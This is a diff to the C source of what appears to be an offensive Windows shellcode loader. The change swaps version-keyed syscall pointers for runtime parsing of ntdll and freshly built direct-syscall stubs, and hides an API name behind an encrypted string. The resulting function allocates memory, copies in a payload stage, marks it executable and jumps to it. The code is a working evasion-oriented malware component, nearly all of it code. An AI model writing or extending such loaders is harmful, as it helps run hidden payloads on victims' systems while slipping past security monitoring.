@@ -1,8 +1,11 @@
 #include <stdio.h>
 #include <windows.h>
+#include <winhttp.h>
 
 #include "loader.h"
+#include "strings.h"
 #include "syscalls.h"
+#include "imports.h"
 
 VOID ExecuteStage(CHAR* Stage, DWORD sSize)
 {
@@ -20,47 +23,27 @@ VOID ExecuteStage(CHAR* Stage, DWORD sSize)
     DWORD status;
     ULONG OldPro;
     LPVOID pBuffer = NULL;
+    struct NtInfo NtdllInfo;
+    struct Syscalls rSyscall;
     SIZE_T uSize = (SIZE_T)sSize;
 
-    OSVERSIONINFOEXW osInfo;
-	osInfo.dwOSVersionInfoSize = sizeof(osInfo);
-
-    // resolve so we can use this later to identify what syscall we need
-    RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");
-
-    // fill the osinfo struct
-    RtlGetVersion(&osInfo);
-
-    // resolve the syscalls we need
-    if ((osInfo.dwMajorVersion) == 10 && (osInfo.dwMinorVersion == 0))
-    {
-        NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
-        NtProtectVirtualMemory  = &NtProtectVirtualMemory10;
-    }
-    else if ((osInfo.dwMajorVersion) == 6 && (osInfo.dwMinorVersion == 3))
-    {
-        NtAllocateVirtualMemory = &NtAllocateVirtualMemory81;
-        NtProtectVirtualMemory  = &NtProtectVirtualMemory81;
-    }
+    ParseNtdll(&NtdllInfo, &rSyscall);
 
     // alloc the memory we need
-    status = NtAllocateVirtualMemory(GetCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
-    if (status != 0)
-    {
-        DEBUG("Failed to NtAllocateVirtualMemory");
-        return;
-    }
+    GetCurrentProcess_ rGetCurrentProcess = (GetCurrentProcess_)GetProcAddress(LoadLibrary("kernel32.dll"), decrypt_string(STRING_KERNEL32_CPROC, STRING_KERNEL32_CPROC_KEY));
+
+    MakeSyscall("NtAllocateVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+    status = rSyscall.NtAllocateVirtualMemory(rGetCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
+    CleanSyscall(SyscallStub);
 
     // copy the memory into the allocated memory
     memcpy(pBuffer, Stage, sSize);
 
     // change the permisions to PAGE_EXECUTE_READWRITE
-    status = NtProtectVirtualMemory(GetCurrentProcess(), &pBuffer, &uSize, PAGE_EXECUTE_READWRITE, &OldPro);
-    if (status != 0)
-    {
-        DEBUG("Failed to NtProtectVirtualMemory10");
-        return;
-    }
+    MakeSyscall("NtProtectVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+    status = rSyscall.NtProtectVirtualMemory(rGetCurrentProcess(), &pBuffer, &uSize, PAGE_EXECUTE_READWRITE, &OldPro);
+    printf("status: 0x%x\n", status);
+    CleanSyscall(SyscallStub);
 
     // execute the code
     ((void(*)())pBuffer)();
